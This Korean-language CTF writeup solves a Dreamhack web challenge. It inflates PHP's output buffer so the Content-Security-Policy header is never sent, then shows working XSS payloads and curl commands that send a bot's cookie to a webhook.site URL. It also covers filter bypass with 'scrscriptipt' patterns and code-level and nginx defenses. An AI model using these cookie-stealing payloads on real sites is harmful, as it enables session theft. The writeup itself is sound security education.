---
layout: post
title:  "Dreamhack 워게임 Broken Buffalo Wings 풀이 — PHP 출력 버퍼를 부풀려 CSP 헤더를 떨궈내는 XSS"
date:   2026-05-14 22:30:00 +0900
categories: security web wargame dreamhack writeup xss csp php
---

## 들어가며

이번 글은 Dreamhack 웹해킹 워게임 **Broken Buffalo Wings** (난이도 Bronze 4) 풀이입니다. 표면적으로는 "또 하나의 XSS 문제"처럼 보이지만, 실제로는 **PHP의 출력 버퍼링과 HTTP 헤더 전송 시점의 미묘한 관계**를 이용해 `Content-Security-Policy` 헤더 자체를 응답에서 사라지게 만드는, 꽤 영리한 트릭이 핵심입니다.

문제 설명에는 친절하게도 큰 힌트가 적혀 있습니다.

> You can solve this problem with the intended solution, but there's also an easier way to do it!
> Take a look at the diff between the patched version and the original challenge.
> 2024.08.23 Due to build issues, the Dockerfile has been modified.

"의도된 풀이도 있지만 더 쉬운 방법도 있다", "패치 전후의 diff를 봐라"라는 말은, 운영하다가 무심코 바꾼 Dockerfile 한 줄이 **취약점을 더 키웠다**는 뜻입니다. 이 글에서 다루는 것이 바로 그 "더 쉬운 방법"입니다.

스포일러로 결론부터 적으면, 최종 페이로드는 다음 한 줄입니다.

```bash
COMMENT="lol<script>location='https://<MY_WEBHOOK>?c='+document.cookie</script>$(printf 's%.0s' {1..60})$(printf 'cript%.0s' {1..61})"
curl -X POST "$SERVER/report.php" --data-urlencode "path=index.php?comment=$COMMENT"
```

이 한 줄에 등장하는 `s 60개 + cript 61개`라는 이상한 패딩이 왜 필요한지를 끝까지 따라가다 보면, PHP의 `output_buffering`, `str_replace`, 그리고 HTTP 헤더가 어떻게 얽혀 있는지를 자연스럽게 이해하게 됩니다.

## 1. 첫인상 — 컴포넌트 그림 그리기

ZIP을 풀면 다음과 같은 구조가 나옵니다.

```
Broken-Buffalo-Wings/
├── docker-compose.yml
└── deploy/
    ├── Dockerfile
    ├── entrypoint.sh
    ├── index.php          ← XSS sink
    ├── report.php         ← 봇을 호출하는 신고 폼
    ├── flag.txt
    ├── img/bw.jpeg
    ├── bot/bot.py         ← Selenium 봇 (관리자 시뮬레이터)
    └── config/
        ├── nginx.conf
        ├── fpm.conf
        └── supervisord.conf
```

Dockerfile 한 컨테이너 안에 **nginx + php-fpm + supervisord + chrome + chromedriver** 가 모두 들어 있고, 외부 포트는 `8000` 하나만 노출됩니다. 즉 사용자 입력은 항상 Nginx → php-fpm → PHP 스크립트 순으로 흐릅니다.

플로우를 간단히 그리면 이렇습니다.

```
[공격자]
   │ ① /report.php POST: path=index.php?comment=<payload>
   ▼
┌──────────────────┐
│ nginx → php-fpm  │
│ /report.php      │── shell_exec("python3 bot.py 'index.php?...'") ──┐
└──────────────────┘                                                   │
                                                                       ▼
                                                              ┌─────────────────┐
                                                              │ bot.py (Chrome) │
                                                              │ flag 쿠키 설정   │
                                                              │ /{path} 방문    │
                                                              └────────┬────────┘
                                                                       │ ② Chrome이 /index.php?comment=<payload>
                                                                       ▼
                                                              ┌─────────────────┐
                                                              │ index.php       │
                                                              │  ← XSS 발생 지점 │
                                                              └─────────────────┘
```

목표: ②에서 봇의 Chrome이 우리의 JS를 실행하게 만들고, `document.cookie`에 들어있는 **flag**를 우리가 통제할 수 있는 곳(`webhook.site` 등)으로 보내는 것입니다.

## 2. 코드 정독

### 2-1. `index.php` — 핵심 함정 4가지

```php
<?php
    if (strlen($_GET['comment'])>500) {
        echo 'Too Long'; die();
    }
    if (isset($_GET['comment'])) {
        $comment = $_GET['comment'];

        if (strpos($comment, 'lol') !== false) {
            $prefix = 'Dreame : Looks delicious ~~ But I like pizza more ';
            echo $prefix . $comment;          // ① RAW echo (필터 없음)
        }

        if (strpos($comment, 'script') !== false) {
            $untrusted_comment = $_GET['comment'];
            while (strpos($untrusted_comment, 'script') !== false) {
                $alert = 'Malicious string Detected !!!!!';
                $untrusted_comment = str_replace('script', '', $untrusted_comment);
                echo $alert;
                echo $untrusted_comment;       // ② 매 iter 마다 출력
            }
        }
    }

    $nonce = base64_encode(random_bytes(20));
    $csp_header = "Content-Security-Policy: default-src 'self'; "
                . "script-src *.bootstrapcdn.com 'nonce-" . $nonce . "'; "
                . "style-src-elem *.bootstrapcdn.com;";
    header($csp_header);                       // ③ CSP를 echo 들 *이후*에 설정
?>
```

함정/단서 4가지를 정리해봅니다.

- **함정 1 — `lol` 분기는 필터가 없다.** comment에 `lol`이 들어 있으면 그대로 `echo $prefix . $comment`. 즉, `<script>` 태그가 통째로 응답 본문에 박힌다.
- **함정 2 — `script` 필터는 "느슨한 루프"다.** `str_replace('script', '', ...)`는 한 번에 모든 `script` 부분 문자열을 제거한다. 하지만 `scrscriptipt`처럼 **제거 후 양쪽이 합쳐 다시 `script`가 만들어지는 경우** 루프가 한 번 더 돈다. 이 점이 두 가지로 악용된다.
  - (a) `<scrscriptipt>`로 필터 우회: 한 번 제거되면 `<script>`로 변신.
  - (b) **루프가 많이 도는 만큼 출력이 누적된다.** 뒤에서 이게 핵심이 된다.
- **함정 3 — CSP 헤더가 `echo` 보다 *나중에* 설정된다.** PHP에서 `header()`는 출력이 클라이언트로 송신되기 전에만 동작한다. 출력이 이미 흘러나가면 헤더 변경은 무시된다(보통 warning 발생).
- **함정 4 — `default-src 'self'; script-src *.bootstrapcdn.com 'nonce-...'`** 형태의 CSP는 인라인 `<script>`를 차단한다 (nonce가 일치해야 함). 그러나 응답에 CSP 헤더 자체가 없다면? 모든 인라인 스크립트가 그냥 실행된다.

이 네 가지를 조합한 시나리오가 "더 쉬운 방법"입니다.

### 2-2. `bot/bot.py` — 봇이 받는 입력

```python
def read_url(paramters, cookie={"name": "name", "value": "value"}):
    parameter = paramters[1][1:] if paramters[1][0] == "/" else paramters[1]
    driver.get("http://127.0.0.1:8000/")
    driver.add_cookie(cookie)
    driver.get(f"http://127.0.0.1:8000/{parameter}")

read_url(argv, {"name": "flag", "value": FLAG})
```

봇은 `argv[1]`을 받아 `http://127.0.0.1:8000/{argv[1]}`을 방문합니다. **쿠키 `flag`는 HttpOnly가 아니므로** JS에서 `document.cookie`로 읽을 수 있습니다. 이게 우리의 exfil 대상입니다.

### 2-3. Dockerfile — "Due to build issues, the Dockerfile has been modified."

이 한 줄이 진짜 단서입니다.

```dockerfile
RUN sed -i '215s/4096/8192/' /etc/php/7.4/fpm/php.ini
```

PHP 7.4 기본 `php.ini`의 **215번째 줄**은 `output_buffering = 4096` 입니다. 이 줄을 8192로 바꿨습니다. 즉, 출력 버퍼 크기를 4 KiB → 8 KiB로 늘렸습니다. 표면적으로는 "빌드 이슈 수정"이지만, 보안 관점에서는 **"공격자가 출력을 더 많이 만들도록 요구하는 패치"** 일 뿐입니다. 출력만 충분히 부풀리면 여전히 같은 트릭이 통합니다.

## 3. 취약점 모델링 — 왜 버퍼를 넘쳐야 하는가

PHP-FPM에서 `output_buffering` 값이 N이면 다음과 같이 동작합니다.

1. `echo`, `print` 등의 출력은 **즉시 클라이언트로 가지 않고 N 바이트짜리 버퍼에 쌓인다.**
2. 버퍼가 가득 차면 자동으로 **flush** 된다.
3. flush 순간 응답 헤더가 함께 송신된다. 이 시점 **이후**의 `header()` 호출은 무시된다.

이 메커니즘이 `index.php`의 위험한 코드 구조와 맞물립니다.

```
[정적 HTML ~2700 bytes]
   │
   ▼
 echo prefix . $comment       (lol 분기: RAW echo)
   │
   ▼
 while (...) {
   echo alert; echo $untrusted_comment;   (script 분기: 매 iter 출력)
 }
   │
   ▼
 header($csp_header);          ← 이 시점에 출력이 8 KiB를 넘었으면 NO-OP
```

즉, **루프가 도는 동안 누적 출력이 8192 바이트를 넘으면, 그 이후의 `header($csp_header)`는 효력이 없다.** 그러면 응답에는 CSP가 없고, 우리가 `lol` 분기에서 박아둔 인라인 `<script>` 가 그대로 실행됩니다.

### 3-1. 루프를 많이 돌리는 패턴 설계

원하는 것: **comment 길이 500 이하** 이면서 **루프가 가능한 한 많이 돌아 출력이 8192 이상**이 되도록 만들기.

후보 패턴: `s` × K개 + `cript` × (K+1)개.

```
sssssssscriptcriptcriptcriptcriptcriptcriptcriptcript
```

- 처음에는 **마지막 `s` + 첫 번째 `cript`** 가 합쳐져 `script` 하나가 생긴다.
- `str_replace`로 그 한 개를 지우면, **그 자리에서 다시 `s` 한 개와 `cript` 한 개가 인접** → 또 `script` 하나가 만들어진다.
- 이 과정이 `s`가 다 떨어질 때까지 반복된다.

`s`가 K개라면 루프가 K번 돈다. 매 iter마다 `echo "Malicious string Detected !!!!!"` (30글자) + `echo $untrusted_comment` (현재 길이) 만큼 출력된다.

K번 iter의 누적 출력 길이는 대략 다음과 같이 모델링됩니다.

```
출력 합 ≈ 30·K + Σ(6K - 1, 6K - 7, ..., 5) = 3K² + 32K
```

| K   | comment 길이 (6K+5) | 필터 누적 출력 (3K² + 32K) |
|-----|---------------------|---------------------------|
| 20  | 125                 | 1840                      |
| 40  | 245                 | 6080                      |
| **53**  | **323**         | **10123 (← > 8192!)**     |
| 60  | 365                 | 12720                     |

정적 HTML(약 2700) + `lol` 분기 출력(약 450) + 필터 출력만 합쳐도 K = 53부터는 안전하게 8192를 넘깁니다. 안전 마진을 위해 실제 실험에선 K = 60을 썼습니다.

### 3-2. XSS 본체 끼워 넣기

`lol` 분기는 comment를 **있는 그대로** 출력합니다. 그래서 본체는 평범한 인라인 `<script>` 면 충분합니다.

```html
lol<script>location='https://webhook.site/<UUID>?c='+document.cookie</script>
```

이게 raw로 응답에 박힌 뒤, 그 다음 필터 루프가 돌면서 출력 버퍼를 부풀려 CSP를 떨궈냅니다. 브라우저가 응답을 받았을 때:

- CSP 없음
- 본문에 인라인 `<script>` 존재 (nonce 없음)
- → 그대로 실행 → 봇이 `webhook.site`로 cookie 전송

## 4. 익스플로잇

### 4-1. webhook.site URL 준비

브라우저에서 `https://webhook.site/` 를 열면 자동으로 고유 URL이 발급됩니다. 예: `https://webhook.site/a83b2576-ef74-4958-a952-98e82bad93a0`

### 4-2. 페이로드 빌드 및 사전 검증

먼저 `/index.php`에 직접 `curl`로 쏴서 **CSP가 정말로 사라지는지** 확인합니다(봇을 거치지 않아도 응답 헤더로 확인 가능).

```bash
python3 -c "
import urllib.parse
K = 60
WEBHOOK = 'https://webhook.site/a83b2576-ef74-4958-a952-98e82bad93a0'
xss = f\"lol<script>location='{WEBHOOK}?c='+document.cookie</script>\"
padding = 's'*K + 'cript'*(K+1)
print(urllib.parse.quote(xss + padding, safe=''))
" > /tmp/payload.txt

SERVER=http://host3.dreamhack.games:15329
PAYLOAD=$(cat /tmp/payload.txt)
curl -sD - "$SERVER/index.php?comment=$PAYLOAD" -o /tmp/body.txt | head -10
```

응답 헤더에서 `Content-Security-Policy: ...` 줄이 **사라졌다면** 트릭이 통한 것입니다. 또한 `/tmp/body.txt`에 `<script>location=...</script>` 문자열이 그대로 박혀 있는지 확인합니다.

```
HTTP/1.1 200 OK
Server: nginx
Date: ...
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
```

CSP 헤더 없음. 정확히 의도한 대로입니다.

### 4-3. 봇 트리거

```bash
PATH_VAL="index.php?comment=$PAYLOAD"
curl -X POST "$SERVER/report.php" --data-urlencode "path=$PATH_VAL"
```

`/report.php`는 내부적으로 `python3 ./bot/bot.py 'index.php?comment=...'`를 실행하고, 봇(Selenium)은 cookie에 flag를 박은 채 우리가 짠 URL을 방문합니다. CSP 없는 응답을 받자마자 인라인 스크립트가 실행되어 `webhook.site` 로 cookie 전체를 보냅니다.

### 4-4. 결과 수확

webhook.site 의 inbox를 새로고침하면 새 GET 요청이 도착해 있습니다.

```
GET https://webhook.site/<UUID>?c=flag=DH{454e0e5672e6ae1724ad0701473768520f21b1fb3364d0ffb13dc5497027cb34}
Host: 23.81.42.210
User-Agent: Mozilla/5.0 (X11; Linux x86_64) ...HeadlessChrome...
```

flag: `DH{454e0e5672e6ae1724ad0701473768520f21b1fb3364d0ffb13dc5497027cb34}` ✓

## 5. 취약점 해설 — Output Buffering Confusion

이 클래스의 버그는 일반화하면 다음과 같이 표현할 수 있습니다.

> **응답 헤더(특히 보안 헤더)가 본문 출력 이후에 설정된다.** 본문 출력이 충분히 커서 버퍼/소켓이 flush 된 뒤라면, 헤더 설정은 "조용히 실패"한다.

이는 PHP만의 문제가 아닙니다. 동일한 패턴이 발견되는 곳:

- Java Servlet에서 `response.getWriter().write(...)` 후에 `response.setHeader("Content-Security-Policy", ...)` 호출 → 본문이 이미 flush 된 뒤라면 무시됨.
- Express(Node.js)에서 `res.write(big)` 으로 header가 송신된 뒤 `res.setHeader(...)` 호출 → `ERR_HTTP_HEADERS_SENT`.
- Go의 `http.ResponseWriter`도 `Write` 후의 `Header()` 변경은 효력 없음.

언어/프레임워크가 달라도, **"한 번 헤더가 송신되면 변경 불가"** 라는 HTTP 자체의 제약은 동일합니다. 이 제약을 잊고 헤더 설정 시점을 본문 출력 뒤로 둔 코드는, 적절한 입력으로 본문 출력을 부풀려서 헤더를 우회할 수 있게 됩니다.

### 5-1. 왜 위험한가

CSP, `X-Frame-Options`, `Strict-Transport-Security`, `X-Content-Type-Options`, `Referrer-Policy` 같은 헤더는 모두 "응답에 함께 보내는 약속"입니다. 약속이 누락되면 모두 다음과 같은 공격이 가능해집니다.

- CSP 누락 → 인라인 XSS 그대로 실행
- HSTS 누락 → 첫 방문 MITM
- X-Frame-Options 누락 → 클릭재킹
- X-Content-Type-Options 누락 → MIME sniffing 기반 XSS

이번 문제는 그 중 첫 번째(CSP) 시나리오를 그대로 실증합니다.

### 5-2. 올바른 방어

코드 레벨에서는 두 가지 원칙이 있습니다.

1. **보안 헤더는 응답 본문 출력 이전에, 한 번에 설정한다.** 가능하면 미들웨어/웹서버에서 일괄 적용한다.

   ```php
   <?php
   $nonce = base64_encode(random_bytes(20));
   header("Content-Security-Policy: default-src 'self'; "
        . "script-src *.bootstrapcdn.com 'nonce-{$nonce}'; "
        . "style-src-elem *.bootstrapcdn.com;");
   // 이후에 echo
   ?>
   ```

2. **사용자 입력은 출력 직전에 정확한 컨텍스트로 escape한다.** "필터링" 대신 **이스케이프**가 본질이다.

   ```php
   echo htmlspecialchars($prefix . $comment, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
   ```

3. 부수적으로, **`str_replace` 기반의 블랙리스트는 신뢰하지 말 것.** `scrscriptipt` 같은 셀프-리폼 패턴이 끝없이 나온다.

Nginx 레벨에서 CSP를 강제하는 것도 좋습니다.

```nginx
add_header Content-Security-Policy "default-src 'self'; ..." always;
```

`always` 플래그가 있어야 4xx/5xx, 부분 응답에서도 헤더가 붙습니다.

## 6. 정리 — 입문자가 가져갈 교훈

- "패치 노트"는 단순한 운영 코멘트가 아니라 **공격면의 변화를 알려주는 정보** 다. "build issues" 같은 모호한 변경 사유 뒤에 진짜 트릭이 숨어 있을 수 있다.
- **HTTP 헤더와 본문 사이의 순서**를 항상 의심하자. 본문이 한 줄이라도 먼저 흘러나가면, 그 뒤의 보안 헤더는 잡히지 않을 수 있다.
- 블랙리스트(`str_replace`로 키워드 지우기) 류의 방어는 거의 항상 우회 가능하다. **이스케이프**가 답이다.
- `str_replace`의 "self-reform" 패턴은 XSS 필터 우회의 단골 손님이다. `<sscriptcript>` 같은 변종에 항상 익숙해두자.
- 같은 도메인에 봇이 있고 cookie가 HttpOnly가 아니라면, 외부 webhook(예: webhook.site)으로 데이터를 흘려보내는 것이 가장 간결한 exfil 경로다.

이 문제를 통해 PHP의 출력 버퍼링이 보안 헤더 적용 시점과 어떻게 얽혀 있는지를 손에 잡히게 학습할 수 있었습니다. 같은 카테고리의 다음 단계로 Dreamhack의 `XSS Filtering Bypass`, `CSPP-1`을 풀어 보면 CSP 우회의 다른 변형(strict-dynamic, JSONP gadget 등)을 추가로 익힐 수 있습니다.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. "intended" 풀이를 먼저 파고들었다

`script-src *.bootstrapcdn.com 'nonce-...'` 라는 CSP를 보자마자 머릿속이 **"bootstrapcdn에 있는 어떤 JS 라이브러리를 script gadget으로 쓸까?"** 로 흘렀습니다. AngularJS의 `ng-app + ng-csp` 트릭이나 jQuery의 `$.parseHTML` 가젯, 또는 JSONP 엔드포인트를 찾는 방향이었죠. 한참을 헛수고하다가 문제 설명의 "easier way" / "diff between patched and original" 문구를 다시 읽고 나서야 **Dockerfile의 `sed`** 줄을 의심하게 되었습니다.

**회고**: 문제에 적힌 모든 텍스트(설명, FYI, Notice, 패치 메모)는 반드시 풀이 전에 끝까지 읽고, **소스 코드뿐 아니라 Dockerfile/엔트리포인트/설정 파일까지 diff처럼 비교**해야 합니다. 처음부터 "왜 일부러 `output_buffering` 줄만 바꿨을까?"라는 질문을 던졌다면 30분은 아꼈을 것입니다.

### 실패 2. 잘못된 VM의 URL을 그대로 사용

직전 문제(baby-Case)가 끝나기 전에 새 VM을 생성해서 호스트가 `host8.dreamhack.games`가 아니라 `host3.dreamhack.games:15329` 로 바뀌었습니다. 이전 URL로 curl을 보내다가 한참 동안 `hi guest` 같은 "이전 문제 응답"을 받고 혼란스러웠습니다.

**회고**: VM 생성 후 가장 먼저 할 일은 `GET /api/v1/wargame/challenges/<id>/live/` 응답의 `host` 와 `port_mappings`를 정확히 확인하고, 그 값을 환경변수에 잡아두는 것. 또한 `curl -I`로 응답의 `Server` 헤더를 확인해 "이 응답이 정말 이 문제 서버의 것인지" 1차 확인 해야 합니다(`X-Powered-By`까지 살피면 더 좋음).

### 실패 3. exfil 채널을 너무 늦게 준비

페이로드를 다 만든 뒤에야 webhook.site 를 열러 갔습니다. 그동안 봇은 짧은 timeout(`set_page_load_timeout(3)`)을 갖고 있어서 다시 시도하면 같은 cookie를 가진 채로 다시 와줄 뿐이긴 하지만, 만약 cookie가 1회용이거나 봇이 rate limit되었다면 문제가 됐을 것입니다.

**회고**: XSS 류 문제를 시작할 때 가장 먼저 할 일은 **exfil 엔드포인트 확보**(webhook.site URL 메모, 또는 자체 nc/ngrok). 페이로드는 그 다음에 만든다. 이 순서가 정확히 "트리거 전에 콜백 채널부터 잡는다"는 일반 익스플로잇 원칙과도 일치합니다.

### 실패 4. 버퍼 크기를 종이에 그려보지 않고 K값을 먼저 무작정 잡았다

처음에 `K = 20` 정도로 시도했다가 CSP가 응답에 그대로 박혀 있어서 당황했습니다. `output_buffering = 8192`임을 다시 계산해보고 `3K² + 32K > 8192 → K ≥ 53` 임을 알아낸 뒤에야 K = 60으로 안전하게 풀렸습니다.

**회고**: 버퍼/오프셋/길이 같은 수치가 등장하는 익스플로잇은 **종이에 식을 적고 임계값을 먼저 풀어야** 합니다. 직관으로 "큰 수"를 넣는 것보다 한 줄 계산이 빠릅니다.
